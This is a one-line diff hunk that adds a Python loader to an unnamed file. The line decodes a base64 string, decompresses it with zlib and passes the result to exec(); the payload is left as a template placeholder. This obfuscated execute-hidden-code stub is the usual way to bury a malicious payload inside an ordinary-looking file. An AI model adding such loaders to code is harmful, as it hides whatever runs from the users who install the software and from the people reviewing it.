@@ -1,0 +1,1 @@
+exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('{{BASE64_REPLACE}}')[0])))
